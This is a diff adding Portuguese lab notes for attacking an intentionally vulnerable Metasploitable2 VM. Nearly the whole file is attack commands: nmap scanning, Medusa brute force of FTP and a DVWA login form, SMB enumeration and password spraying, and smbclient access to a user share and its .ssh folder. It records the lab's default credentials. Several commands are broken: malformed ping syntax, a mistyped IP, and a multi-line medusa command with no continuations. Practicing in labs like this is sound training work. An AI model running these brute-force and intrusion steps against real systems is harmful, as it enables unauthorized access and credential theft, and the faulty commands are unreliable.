@@ -1,0 +1,46 @@
+# Metasploitable2
+ip a
+
+# Alcançando a máquina vulnerável no Metasploitable 2
+ping - c 3 192.168.56.101/24
+
+# Escaneia as portas
+nmap -sV -p 20,21,80,445,139 192.168.56.101
+
+# FTP ativo, conecta-se a ele
+ftp 92.168.56.101
+
+# Ataque Brute force FTP utilizando Medusa
+# criar users.txt
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+# criar pass.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+# ataque ao servico FTP
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+
+# Ataque Brute force em formulário web (DVWA) utilizando Medusa (http form)
+# acessar DVWA no navegador: http://192.168.56.101/dvwa/login.php
+
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http
+-m PAGE:'/dvwa/login.php'
+-m FORM:'username=^USER^&password=^PASS^&Login=Login'
+-m 'FAIL=Login failed' -t 6
+
+# Validação no avegador
+Credenciais validas encontradas: user: admin password:password
+
+# Ataque SMB: enumeração + password spraying (Medusa) Enumeração SMB (salvar output)
+enum4linux -a 192.168.56.101 > enum_smb_192.168.56.101.txt
+
+smbclient -L //192.168.56.101 -N
+
+medusa -h 192.168.56.101 -U users_smb.txt -P pass_smb.txt -M smbnt -t 10
+
+smbclient -L //192.168.56.101 -U msfadmin%msfadmin
+
+# Acessar share e listar arquivos
+smbclient //192.168.56.101/msfadmin -U msfadmin%msfadmin
+
+cd .ssh ls
